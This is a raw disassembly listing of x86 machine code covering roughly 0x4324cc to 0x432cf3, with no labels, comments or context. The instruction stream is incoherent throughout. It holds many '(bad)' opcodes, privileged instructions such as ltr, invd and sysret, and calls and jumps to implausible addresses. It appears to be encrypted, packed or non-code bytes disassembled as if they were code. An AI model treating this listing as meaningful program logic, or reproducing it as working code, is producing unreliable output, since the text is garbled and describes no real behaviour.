  4324cc:	or     BYTE PTR [eax],al
  4324ce:	jne    0x432459
  4324d0:	mov    esi,esp
  4324d2:	call   0x77a9b097
  4324d7:	inc    ebp
  4324d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324e4:	add    BYTE PTR [esi+0x7d],ah
  4324e7:	inc    ebp
  4324e8:	mov    bx,WORD PTR [ebp+0x8]
  4324ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4324f3:	inc    ebp
  4324f4:	mov    bx,di
  4324f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4324fe:	jge    0x4324c1
  432500:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432506:	cli    
  432507:	xor    bl,bh
  432509:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43250f:	test   BYTE PTR [eax],cl
  432511:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432518:	cmp    ebp,eax
  43251a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432521:	test   BYTE PTR [ebp+0x1],bh
  432524:	mov    ebx,0x458a00
  432529:	xor    esi,DWORD PTR [ebx]
  43252b:	add    esp,DWORD PTR [esi-0x77]
  43252e:	pop    ebp
  43252f:	loopne 0x432597
  432531:	inc    ebp
  432532:	clc    
  432533:	xor    edi,DWORD PTR [ebx]
  432535:	add    esi,DWORD PTR [edx-0x77]
  432538:	data16 fdivr QWORD PTR [ebp-0x49]
  43253c:	mov    ebx,0xb78afc
  432541:	hlt    
  432542:	xor    edi,DWORD PTR [esi+eiz*2]
  432545:	add    BYTE PTR [ebp+0x66],bl
  432548:	data16 lock clc 
  43254b:	cmp    al,0x3b
  43254d:	add    BYTE PTR [edi+0x66],dh
  432550:	psubq  mm7,QWORD PTR [ebp+0x2]
  432554:	ltr    WORD PTR [ebp+0x66]
  432558:	add    esi,eax
  43255a:	add    di,WORD PTR [ebp+0x2b]
  43255e:	data16 data16 jge 0x4325df
  432562:	mov    ebx,0xe08a8b
  432567:	jge    0x43259c
  432569:	data16 data16 xor al,0x5d
  43256d:	data16 data16 jne 0x432569
  432571:	mov    edi,DWORD PTR [ebx]
  432573:	fdiv   QWORD PTR [edx+0x7d]
  432576:	data16 data16 jge 0x4325ae
  43257a:	mov    ebx,0x758a66
  43257f:	mov    esi,0x667233
  432584:	pop    ebp
  432585:	or     BYTE PTR [esi+0x0],ah
  432588:	clc    
  432589:	mov    edi,DWORD PTR [ebx]
  43258b:	lock ja 0x432519
  43258e:	(bad)  
  432590:	jge    0x432589
  432592:	invd   
  432594:	pop    ebp
  432595:	add    BYTE PTR [ebx],al
  432597:	(bad)  
  432598:	cmp    di,WORD PTR [ebp+0xf]
  43259c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325a0:	mov    bx,WORD PTR [ebp-0x10]
  4325a4:	pop    bp
  4325a6:	fbstp  TBYTE PTR [ebx]
  4325a8:	test   DWORD PTR [ebx],eax
  4325aa:	add    BYTE PTR [ebx],bh
  4325ac:	add    BYTE PTR [esi+0x7d],ah
  4325af:	jge    0x43253c
  4325b1:	data16 in al,dx
  4325b3:	pop    ebp
  4325b4:	stc    
  4325b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325bc:	mov    edi,ebx
  4325be:	in     al,dx
  4325bf:	test   BYTE PTR [ebp+0x0],bh
  4325c2:	mov    eax,DWORD PTR [eax]
  4325c4:	call   0xbd401f54
  4325c9:	cmp    al,0x9b
  4325cb:	add    BYTE PTR [edx],dh
  4325cd:	mov    bx,di
  4325d0:	call   0x8b4ba360
  4325d5:	add    ebp,esp
  4325d7:	mov    bx,di
  4325da:	jnp    0x432602
  4325dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325e2:	mov    eax,DWORD PTR [eax]
  4325e4:	call   0x7c3eb14f
  4325e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4325ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4325f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4325fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432604:	(bad)  
  432605:	cld    
  432606:	jne    0x432644
  432608:	xor    eax,DWORD PTR [eax]
  43260a:	mov    esp,DWORD PTR [esi-0x10]
  43260d:	sti    
  43260e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432615:	data16 adc bl,bh
  432618:	push   ebp
  432619:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432620:	mov    WORD PTR [eax],es
  432622:	fwait
  432623:	data16 xor bh,bl
  432626:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43262c:	mov    esp,DWORD PTR [esi-0x14]
  43262f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432635:	or     al,0x2b
  432637:	mov    bh,0xba
  432639:	hlt    
  43263a:	mov    bh,bl
  43263c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432642:	dec    esi
  432643:	or     al,0x0
  432645:	mov    edi,DWORD PTR [ebx]
  432647:	or     BYTE PTR [ebp+0x3b],dh
  43264a:	mov    ecx,DWORD PTR [edi]
  43264c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432652:	xor    al,0xd8
  432654:	pop    bp
  432656:	lock xor esi,DWORD PTR [ebx]
  432659:	lea    esp,[esi+0x1f]
  43265c:	icebp  
  43265d:	jb     0x432663
  43265f:	add    al,al
  432661:	jge    0x43266f
  432663:	mov    eax,eax
  432665:	fsubr  st,st(3)
  432667:	pop    ebp
  432668:	mov    esi,DWORD PTR [ebx]
  43266a:	in     al,0x8d
  43266c:	rcr    DWORD PTR [edi],0xc2
  43266f:	jb     0x4326cf
  432671:	add    cl,cl
  432673:	jge    0x432681
  432675:	mov    edx,DWORD PTR [ebp-0x20]
  432678:	in     al,dx
  432679:	pop    ebp
  43267a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43267f:	cmp    di,WORD PTR [ebp+0x0]
  432683:	mov    ebp,DWORD PTR [ebx]
  432685:	fdivr  QWORD PTR [esi+0x668a5d]
  43268b:	cmp    al,0x33
  43268d:	mov    si,0x4e7d
  432691:	mov    eax,DWORD PTR [eax]
  432693:	lock inc ebp
  432695:	mov    esi,DWORD PTR [eax]
  432697:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43269e:	clc    
  43269f:	(bad)  
  4326a0:	cmp    edi,DWORD PTR [ebx]
  4326a2:	je     0x4326b3
  4326a4:	push   ebx
  4326a5:	loopne 0x4326b6
  4326a7:	dec    ecx
  4326a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4326ac:	int    0xf1
  4326ae:	mov    esi,0x703084d
  4326b3:	pcmpgtd mm6,mm1
  4326b6:	add    BYTE PTR [ebp+0x66],dh
  4326b9:	jmp    0x432686
  4326bb:	mov    eax,DWORD PTR [ebx]
  4326bd:	lock push ebp
  4326bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326c5:	or     bh,dl
  4326c7:	jb     0x4326c7
  4326c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326cf:	loopne 0x4326d1
  4326d1:	jne    0x4326d5
  4326d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4326d7:	mov    ecx,ebx
  4326d9:	data16 cmp al,0xf1
  4326dc:	add    BYTE PTR [esi+eiz*2],bh
  4326df:	add    bl,cl
  4326e1:	retw   0xf2
  4326e5:	ret    0x66
  4326e8:	retf   
  4326e9:	enterw 0x4df1,0x19
  4326ee:	pop    edi
  4326ef:	jne    0x432672
  4326f1:	mov    esi,DWORD PTR [eax]
  4326f3:	call   0x77b7b294
  4326f8:	xor    ebp,DWORD PTR [ebx]
  4326fa:	lea    esp,[esi+0x48]
  4326fd:	repnz in eax,0x3b
  432700:	add    BYTE PTR [ebp-0x37],dh
  432703:	xor    edx,DWORD PTR [ebp-0x15]
  432706:	in     al,dx
  432707:	xor    edx,DWORD PTR [esi+0x40]
  43270a:	mov    DWORD PTR [edi],0x338545fc
  432710:	clc    
  432711:	add    esi,DWORD PTR [ecx]
  432713:	pop    edi
  432714:	pushf  
  432715:	pop    ebx
  432716:	call   0xff4426dd
  43271b:	mov    edi,eax
  43271d:	push   ecx
  43271e:	pop    es
  43271f:	mov    edi,DWORD PTR [eax]
  432721:	push   esi
  432722:	inc    esi
  432723:	add    bh,BYTE PTR [esi+0x0]
  432726:	popa   
  432727:	data16 (bad) 
  432729:	into   
  43272a:	gs cmp al,0xcd
  43272d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432733:	ret    0x66
  432736:	add    bh,al
  432738:	add    bh,ah
  43273a:	add    BYTE PTR [ebp+0x31c3f866],al
  432740:	cmp    al,0x9c
  432742:	add    BYTE PTR [esi+0x66],ah
  432745:	into   
  432746:	ret    
  432747:	pop    ebp
  432748:	adc    BYTE PTR [edi+0x0],dl
  43274b:	mov    bh,0x66
  43274d:	mov    edi,0xff038dc3
  432752:	jne    0x4327a8
  432754:	lea    edx,[ecx+0x1]
  432757:	mov    ebx,0xd64ff1
  43275c:	sar    DWORD PTR [ebx],1
  43275e:	test   BYTE PTR [ebp+0x36],dh
  432761:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432765:	push   edi
  432766:	xor    BYTE PTR [ebx],0x38
  432769:	mov    esi,ebx
  43276b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432771:	ss inc ebp
  432773:	fs pop ebx
  432775:	mov    ebx,0x9c3b30
  43277a:	je     0x4327a7
  43277c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432782:	mov    WORD PTR [ebx],?
  432784:	ss mov ebx,0x8b4e64
  43278a:	pop    edi
  43278b:	cmp    ecx,ecx
  43278d:	jne    0x4327e4
  43278f:	mov    ebp,esp
  432791:	cld    
  432792:	push   esi
  432793:	pop    ebx
  432794:	inc    ebp
  432795:	stc    
  432796:	xor    BYTE PTR [ebp+0x9bef89c],al
  43279c:	test   esi,ecx
  43279e:	clc    
  43279f:	test   dl,dl
  4327a1:	cmp    bh,bh
  4327a3:	fs pop si
  4327a6:	or     bl,al
  4327a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4327ae:	retf   0x3c45
  4327b1:	xor    BYTE PTR [eax],al
  4327b3:	pushf  
  4327b4:	mov    si,0x85ca
  4327b8:	ret    0xf8
  4327bb:	pop    ebx
  4327bc:	dec    dx
  4327bf:	mov    edx,DWORD PTR [edi-0x76]
  4327c2:	push   edi
  4327c3:	add    al,0xb7
  4327c5:	xor    al,0xba
  4327c7:	cmp    al,0x8d
  4327c9:	je     0x4327ca
  4327cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327cf:	lea    edi,[ebx+0x544fff]
  4327d5:	push   ecx
  4327d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4327d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327df:	add    BYTE PTR [ebx],dh
  4327e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4327ee:	mov    ebx,0x3b3b00
  4327f3:	jne    0x432820
  4327f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4327fb:	xor    esi,DWORD PTR [ebx]
  4327fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432803:	push   edi
  432804:	cmp    esp,ebp
  432806:	jne    0x432808
  432808:	sbb    DWORD PTR [eax],0x8085c3fc
  43280e:	clc    
  43280f:	inc    esi
  432810:	pop    ebx
  432811:	sti    
  432812:	add    eax,0xeb8bc075
  432817:	cld    
  432818:	xor    edi,DWORD PTR ds:0xf8c3855e
  43281e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432821:	rol    DWORD PTR [ebp-0x37],0xf
  432825:	mov    DWORD PTR [eax],ecx
  432827:	inc    edi
  432828:	(bad)  
  432829:	in     eax,0xfe
  43282b:	add    bh,bh
  43282d:	(bad)  
  43282e:	mov    esi,0xc38a5e
  432833:	mov    esi,DWORD PTR [ebx]
  432835:	push   ecx
  432836:	mov    edi,0xfc4ec7
  43283b:	test   DWORD PTR [ebp-0x8],edx
  43283e:	xor    di,ax
  432841:	pushf  
  432842:	sub    ebp,eax
  432844:	inc    ebp
  432845:	(bad)  
  432846:	sub    edi,edi
  432848:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43284e:	inc    ebp
  43284f:	add    BYTE PTR [esi+0x2b],ah
  432852:	or     bh,BYTE PTR [edx+0xf8ac2]
  432858:	cmp    al,0x33
  43285a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432860:	(bad)  
  432861:	cmp    esi,DWORD PTR [ebx]
  432863:	je     0x43281d
  432865:	push   ebx
  432866:	dec    esi
  432867:	str    ecx
  43286a:	cmp    esp,DWORD PTR [ebp+0x75]
  43286d:	int    0x33
  43286f:	mov    edi,0x789085f
  432874:	mov    edx,DWORD PTR [eax]
  432876:	cld    
  432877:	add    cl,cl
  432879:	data16 add al,0xcb
  43287c:	push   ebp
  43287d:	add    ebp,esp
  43287f:	jne    0x43286d
  432881:	(bad)  
  432882:	mov    DWORD PTR [ecx],0xd685f7ec
  432888:	clc    
  432889:	xlat   BYTE PTR ds:[ebx]
  43288a:	inc    ebp
  43288b:	mov    esi,DWORD PTR [edx]
  43288d:	push   eax
  43288e:	pushf  
  43288f:	in     eax,0x8b
  432891:	add    ah,ch
  432893:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432897:	add    ax,0x72cb
  43289b:	cmp    al,0x0
  43289d:	add    BYTE PTR [ebp+0x66],al
  4328a0:	(bad)  
  4328a1:	retf   
  4328a2:	lock ret 0x85
  4328a6:	clc    
  4328a7:	inc    bp
  4328a9:	retf   
  4328aa:	cmp    eax,0xc77d9cc8
  4328af:	xor    ah,bh
  4328b1:	pushf  
  4328b2:	test   DWORD PTR [edi-0x8],ebx
  4328b5:	je     0x4328fc
  4328b7:	xor    esi,DWORD PTR ds:0x7020840
  4328bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4328c1:	push   ebp
  4328c2:	add    esp,ebp
  4328c4:	jb     0x432851
  4328c6:	add    BYTE PTR [eax],cl
  4328c8:	dec    ebp
  4328c9:	mov    bh,0x81
  4328cb:	push   esi
  4328cc:	push   esp
  4328cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328d4:	xor    al,BYTE PTR [eax]
  4328d6:	mov    edx,DWORD PTR [edi+0x10]
  4328d9:	(bad)  
  4328da:	scas   eax,DWORD PTR es:[edi]
  4328db:	ret    0x3b
  4328de:	jns    0x3b4425d1
  4328e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328e8:	dec    ebp
  4328e9:	or     BYTE PTR [ebx],ch
  4328eb:	ret    0x458b
  4328ee:	lock jmp 0x4328e2
  4328f1:	mov    ecx,DWORD PTR [eax]
  4328f3:	or     BYTE PTR [edi],al
  4328f5:	mov    ecx,eax
  4328f7:	xor    DWORD PTR [edx+0x2],0x0
  4328fb:	mov    bh,0xc1
  4328fd:	adc    BYTE PTR [eax],dh
  4328ff:	iret   
  432900:	inc    ebp
  432901:	mov    DWORD PTR [ebx],0x4dfff8c4
  432907:	inc    BYTE PTR [ebx]
  432909:	ret    0xf8
  43290c:	adc    DWORD PTR [esi+0x10],esp
  43290f:	clc    
  432910:	dec    ecx
  432911:	fisttp WORD PTR [ecx+0x456604c0]
  432917:	add    dh,BYTE PTR ds:0x75e0845
  43291d:	ret    0x4d
  432920:	lea    ecx,[ebx+0x18728301]
  432926:	add    BYTE PTR [ebp+0x45],al
  432929:	xor    ecx,ebp
  43292b:	pushf  
  43292c:	add    bh,al
  43292e:	add    al,ch
  432930:	inc    ebp
  432931:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432937:	xor    eax,0x781084d
  43293c:	push   esp
  43293d:	fwait
  43293e:	push   ecx
  43293f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432945:	inc    ebp
  432946:	cmp    edi,DWORD PTR [ecx]
  432948:	jbe    0x4328e6
  43294a:	mov    eax,edi
  43294c:	or     ah,dh
  43294e:	inc    ebp
  43294f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432955:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43295b:	in     al,dx
  43295c:	hlt    
  43295d:	push   esp
  43295e:	push   esp
  43295f:	push   ecx
  432960:	push   ecx
  432961:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432967:	fwait
  432968:	fwait
  432969:	xor    dh,BYTE PTR [edx]
  43296b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432971:	or     BYTE PTR [ebp+0x7],al
  432974:	mov    eax,ecx
  432976:	clc    
  432977:	jb     0x43293a
  432979:	add    BYTE PTR [ebp+0x55],cl
  43297c:	or     DWORD PTR [edi],0xc251d154
  432982:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43298c:	mov    edi,eax
  43298e:	or     cl,al
  432990:	inc    ebp
  432991:	dec    ebp
  432992:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432998:	or     WORD PTR [ecx],0x899b
  43299d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329a3:	mov    edx,DWORD PTR [ecx+0x8]
  4329a6:	mov    eax,DWORD PTR [ebp-0x8]
  4329a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329b6:	inc    ebp
  4329b7:	dec    eax
  4329b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329be:	add    edx,DWORD PTR [ecx-0x8]
  4329c1:	mov    ecx,DWORD PTR [ecx]
  4329c3:	clc    
  4329c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329cb:	mov    ecx,ebp
  4329cd:	clc    
  4329ce:	(bad)  
  4329cf:	popf   
  4329d0:	inc    DWORD PTR [eax]
  4329d2:	ret    0x8b
  4329d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329db:	mov    edi,esp
  4329dd:	hlt    
  4329de:	test   ecx,esi
  4329e0:	clc    
  4329e1:	or     BYTE PTR [ebp+0x7],al
  4329e4:	xor    al,cl
  4329e6:	pushf  
  4329e7:	jb     0x432a1c
  4329e9:	add    BYTE PTR [eax-0x3f],al
  4329ec:	inc    eax
  4329ed:	daa    
  4329ee:	inc    ebp
  4329ef:	inc    ebp
  4329f0:	xor    eax,0x7f80803
  4329f5:	dec    ebp
  4329f6:	fwait
  4329f7:	add    esi,DWORD PTR [edx]
  4329f9:	clc    
  4329fa:	cmp    DWORD PTR [ecx],ecx
  4329fc:	or     al,0x8
  4329fe:	add    al,BYTE PTR [ebp+0x2c]
  432a01:	xor    eax,0x7350845
  432a06:	or     BYTE PTR [ebp+0x7],cl
  432a09:	lea    ebx,[ebx-0x748dcdff]
  432a0f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a16:	mov    edx,DWORD PTR [eax]
  432a18:	cld    
  432a19:	dec    ebp
  432a1a:	push   esp
  432a1b:	sub    edx,DWORD PTR [ecx-0x75]
  432a1e:	add    eax,0xf172fc
  432a23:	or     BYTE PTR [ebp+0x7],cl
  432a26:	add    eax,ecx
  432a28:	or     al,0x72
  432a2a:	add    DWORD PTR [eax],eax
  432a2c:	mov    ebx,0x29c2c1
  432a31:	inc    ebp
  432a32:	mov    eax,DWORD PTR [ebx]
  432a34:	cmp    eax,0x3004d1c
  432a3a:	xbegin 0x66c8b634
  432a40:	clc    
  432a41:	or     BYTE PTR [ebp+0x45],al
  432a44:	xor    dh,BYTE PTR ds:0x78b089c
  432a4a:	adc    BYTE PTR [ebp+0x45],cl
  432a4d:	lea    eax,[ebp+0x33727501]
  432a53:	add    cl,ch
  432a55:	inc    ebp
  432a56:	add    bl,ch
  432a58:	add    BYTE PTR [ebx+0x45850845],cl
  432a5e:	je     0x4329eb
  432a60:	push   ebx
  432a61:	or     al,0x85
  432a63:	dec    ebp
  432a64:	std    
  432a65:	mov    bh,bh
  432a67:	mov    BYTE PTR [ebp-0x75],al
  432a6a:	mov    edi,eax
  432a6c:	or     al,0x89
  432a6e:	inc    ebp
  432a6f:	clc    
  432a70:	mov    esp,esp
  432a72:	hlt    
  432a73:	call   DWORD PTR [edi-0x37]
  432a76:	push   esp
  432a77:	or     al,0x51
  432a79:	push   ebp
  432a7a:	xor    ebp,esp
  432a7c:	mov    esi,0x457251
  432a81:	xor    esi,eax
  432a83:	pushf  
  432a84:	inc    ebp
  432a85:	(bad)  
  432a86:	mov    edi,eax
  432a88:	or     al,0x85
  432a8a:	add    al,bh
  432a8c:	inc    eax
  432a8e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432a92:	or     ah,bh
  432a94:	inc    eax
  432a95:	push   esp
  432a96:	jmp    0x432ae9
  432a98:	mov    eax,DWORD PTR ds:0xe8720c
  432a9e:	mov    DWORD PTR [ebp-0x8],eax
  432aa1:	jne    0x432ae8
  432aa3:	jmp    0x432a30
  432aa5:	mov    ebp,DWORD PTR [eax]
  432aa7:	clc    
  432aa8:	retf   0xff54
  432aab:	push   ecx
  432aac:	mov    DWORD PTR ds:0x757210,eax
  432ab2:	mov    ecx,DWORD PTR [ebp-0x4]
  432ab5:	sub    esp,DWORD PTR [ebx-0x77]
  432ab8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432abf:	or     ah,bh
  432ac1:	pop    es
  432ac2:	ds fwait
  432ac4:	push   DWORD PTR [edx]
  432ac6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432acc:	(bad)  
  432acd:	mov    bh,bh
  432acf:	jmp    0x432abd
  432ad1:	leave  
  432ad2:	jne    0x432adc
  432ad4:	call   0x30242e
  432ad9:	in     al,dx
  432ada:	dec    ebp
  432adb:	add    dh,BYTE PTR [ebx]
  432add:	add    BYTE PTR [ebx],al
  432adf:	inc    ebp
  432ae0:	cmp    esi,DWORD PTR [ecx]
  432ae2:	je     0x432a80
  432ae4:	mov    eax,edi
  432ae6:	or     al,0xf0
  432ae8:	add    BYTE PTR [ebp+0x458bf845],al
  432aee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432af4:	adc    al,0x7
  432af6:	enter  0x9fc0,0xa5
  432afa:	rol    BYTE PTR [eax],0x5e
  432afd:	mov    ecx,ecx
  432aff:	or     al,0xc
  432b01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b08:	jmp    0x432b09
  432b0a:	push   ebp
  432b0b:	mov    esp,ebp
  432b0d:	cld    
  432b0e:	inc    ebp
  432b0f:	inc    ebp
  432b10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b17:	push   esi
  432b18:	push   esi
  432b19:	mov    edi,0x7af080f
  432b1e:	add    bh,al
  432b20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b26:	add    BYTE PTR [ecx+0x4540100f],cl
  432b2c:	mov    ebp,eax
  432b2e:	mov    ebp,edi
  432b30:	lock call edx
  432b33:	fcom   DWORD PTR [ebp+0x45]
  432b36:	mov    eax,0x148a8b
  432b3b:	push   ecx
  432b3c:	enter  0xc145,0x83
  432b40:	cmp    ecx,DWORD PTR [eax]
  432b42:	add    BYTE PTR [ebp+0x4d],al
  432b45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b4b:	call   0xffa326ba
  432b50:	cmp    eax,DWORD PTR [ebp-0xc]
  432b53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b57:	push   ebp
  432b58:	(bad)  
  432b59:	call   0x34295d
  432b5e:	mov    bh,0xdb
  432b60:	cld    
  432b61:	or     BYTE PTR [ebp+0x45],bl
  432b64:	(bad)  
  432b65:	call   0xff7d27f5
  432b6a:	add    al,BYTE PTR [ebp+0x37]
  432b6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b73:	jne    0x432b75
  432b75:	(bad)  
  432b76:	cmp    edi,esp
  432b78:	jne    0x432bab
  432b7a:	mov    edi,edi
  432b7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b82:	pop    ds
  432b83:	into   
  432b84:	je     0x432b47
  432b86:	mov    ebx,DWORD PTR [esi]
  432b88:	or     BYTE PTR [ebp-0x49],al
  432b8b:	mov    esp,DWORD PTR [esi-0x77]
  432b8e:	mov    esi,0x2451f0c
  432b93:	mov    eax,DWORD PTR [eax]
  432b95:	or     al,0x66
  432b97:	sar    bl,0x3b
  432b9a:	xor    esi,DWORD PTR [ebp+0x66]
  432b9d:	xor    ecx,edi
  432b9f:	pop    edi
  432ba0:	adc    bl,BYTE PTR [ebx+0x7e]
  432ba3:	ret    0xff
  432ba6:	cld    
  432ba7:	inc    ebp
  432ba8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bae:	cld    
  432baf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bb6:	push   0xffffff83
  432bb8:	pop    edi
  432bb9:	or     BYTE PTR [ebp+0x53],dh
  432bbc:	xorps  xmm1,xmm2
  432bbf:	test   BYTE PTR [eax+eax*1],bh
  432bc2:	add    BYTE PTR [eax],al
  432bc4:	adc    eax,eax
  432bc6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432bce:	jmp    DWORD PTR [eax]
  432bd0:	ror    al,0x5e
  432bd3:	inc    ebp
  432bd4:	leave  
  432bd5:	xor    ecx,DWORD PTR [eax]
  432bd7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bdd:	add    ah,al
  432bdf:	xor    edi,edi
  432be1:	xor    DWORD PTR [ebx],0x66003302
  432be7:	mov    DWORD PTR [ebp-0xc],ecx
  432bea:	pcmpgtw mm0,mm0
  432bed:	add    dl,ah
  432bef:	leave  
  432bf0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432bf4:	push   eax
  432bf5:	dec    ebp
  432bf6:	mov    esi,DWORD PTR [ebx-0x75]
  432bf9:	lea    ebp,[eax-0x7c00ff02]
  432bff:	xor    eax,DWORD PTR [eax]
  432c01:	sysret 
  432c03:	dec    ebp
  432c04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c0b:	push   WORD PTR [ecx+0x8]
  432c0f:	jne    0x432bd2
  432c11:	ud0    ecx,DWORD PTR [ecx]
  432c14:	mov    eax,edx
  432c16:	lods   al,BYTE PTR ds:[esi]
  432c17:	add    BYTE PTR [eax],al
  432c19:	data16 (bad) 
  432c1b:	iret   
  432c1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c23:	cli    
  432c24:	inc    ebp
  432c25:	cmp    al,0x8d
  432c27:	add    BYTE PTR [esi+0x2d],ah
  432c2a:	inc    ebp
  432c2b:	pop    ebp
  432c2c:	lea    ecx,[edi]
  432c2e:	mov    dl,bh
  432c30:	add    BYTE PTR [edi],cl
  432c32:	mov    DWORD PTR [eax+eax*8],edi
  432c35:	mov    ebx,0x3b87
  432c3a:	add    BYTE PTR [ebx],ch
  432c3c:	inc    ebp
  432c3d:	data16 (bad) 
  432c3f:	clc    
  432c40:	int3   
  432c41:	cmp    eax,DWORD PTR [eax]
  432c43:	je     0x432bce
  432c45:	push   0xffffffc8
  432c47:	pop    edi
  432c48:	xchg   DWORD PTR [ebp+0x0],eax
  432c4b:	data16 add BYTE PTR [ebp+0x45],cl
  432c4f:	lea    cx,[ebp+0x10]
  432c53:	jb     0x432c55
  432c55:	jmp    0x432be0
  432c57:	call   eax
  432c59:	clc    
  432c5a:	xchg   DWORD PTR [edi+0x1],edi
  432c5d:	mov    eax,DWORD PTR [eax]
  432c5f:	or     BYTE PTR [ebp-0x49],al
  432c62:	lea    eax,[eax+0x74003154]
  432c68:	push   edi
  432c69:	inc    edx
  432c6a:	jge    0x432c6b
  432c6c:	mov    DWORD PTR [edi],ecx
  432c6e:	fdiv   DWORD PTR [edi-0x6]
  432c71:	inc    DWORD PTR [eax]
  432c73:	xor    edx,DWORD PTR [eax+0x5f]
  432c76:	xchg   DWORD PTR [ebx+0x1],ebx
  432c79:	ret    0x0
  432c7c:	xor    BYTE PTR [ebp-0x51],cl
  432c7f:	cmp    edi,0xf0ff89fe
  432c85:	data16 ror al,0x84
  432c89:	rol    BYTE PTR [eax],0x3b
  432c8c:	add    al,dh
  432c8e:	dec    eax
  432c8f:	xchg   esp,eax
  432c90:	push   ebx
  432c91:	jmp    0x432c1e
  432c93:	push   ebp
  432c94:	add    esp,ebp
  432c96:	add    ebp,esp
  432c98:	mov    edx,DWORD PTR [edi+0x24]
  432c9b:	clc    
  432c9c:	dec    esi
  432c9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ca3:	cmp    BYTE PTR [ebx],al
  432ca5:	jne    0x432c30
  432ca7:	xor    esp,eax
  432ca9:	jmp    0x462e2c
  432cae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cb1:	jne    0x432ca7
  432cb3:	call   0xffcd2a0d
  432cb8:	clc    
  432cb9:	xchg   edi,eax
  432cba:	sti    
  432cbb:	add    DWORD PTR [ebx],eax
  432cbd:	add    BYTE PTR [ebp+0x47],bl
  432cc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cc6:	pop    ebp
  432cc7:	mov    DWORD PTR [esi-0x48],esi
  432cca:	jmp    0x432d13
  432ccc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432cd2:	(bad)  
  432cd4:	cmp    al,0x0
  432cd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432cd9:	lea    ebx,[ebp-0x56]
  432cdc:	jle    0x432cde
  432cde:	jae    0x432c69
  432ce0:	mov    eax,esp
  432ce2:	call   0xb900:0x8b005587
  432ce9:	inc    ebp
  432cea:	push   ebp
  432ceb:	lea    ecx,[ebp-0x27ff4f12]
  432cf1:	mov    eax,edi
  432cf3:	int3   
